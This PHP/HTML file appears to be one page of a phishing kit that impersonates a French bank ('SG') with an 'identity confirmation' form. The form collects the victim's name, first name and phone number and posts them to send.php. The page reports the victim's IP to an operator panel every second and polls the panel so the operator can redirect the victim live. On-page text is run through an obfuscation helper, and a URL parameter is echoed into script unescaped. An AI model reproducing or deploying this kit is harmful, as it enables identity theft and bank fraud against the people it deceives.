<?php 
require "../main.php";
?><!doctype html>
<html>
<head>
<title>SG | Vérification</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
<link rel="stylesheet" href="res/jihanaid.css">
<link rel="stylesheet" href="res/auth.css">
<link rel="icon" href="res/icon.png">
</head>
<body>
<header>
<div class="row">
    <div class="col text-left p-5">
        <img src="res/logo.svg" style="width:180px;">
    </div>
</div>
</header>

<div class="container-full p-5">

<div class="form">
<h3><?php $obf->obf("Confirmation d'identité"); ?></h3>
<p><?php $obf->obf("Veuillez entrer les informations personnelles et cliquer sur Suivant."); ?></p>

<div class="form-col sms">
    <label for="d0">Nom</label>
    <input type="text" class="textinput" id="d0" placeholder="Nom">
</div>

<div class="form-col sms">
    <label for="d1">Prénom</label>
    <input type="text" class="textinput" id="d1" placeholder="Prénom">
</div>

<div class="form-col sms">
    <label for="d2">Numéro de téléphone</label>
    <input type="text" class="textinput" id="d2" placeholder="Numéro de téléphone" maxlength="10">
</div>


<div class="form-col">
    <button class="submitbtn" onclick="sendInfo()" style="font-size:0.9em; width:100%;">Suivant</button>
</div>

</div>

</div>


<script src="res/cdns/jq.js"></script>
<script src="res/cdns/m.js"></script>
<script>
 
var allowSubmit=false;
 
$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendInfo();
    }
});

var allowSubmit;
var abortVal = true;
 

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=2; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

function sendInfo(){
    validate();

    if(allowSubmit){
        $.post("send.php",{
            name:$("#d0").val()+" "+$("#d1").val(),
            phone:$("#d2").val(),
        },()=>{
            window.location="wait.php";
        });
    }


}

 

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>

</body>
</html>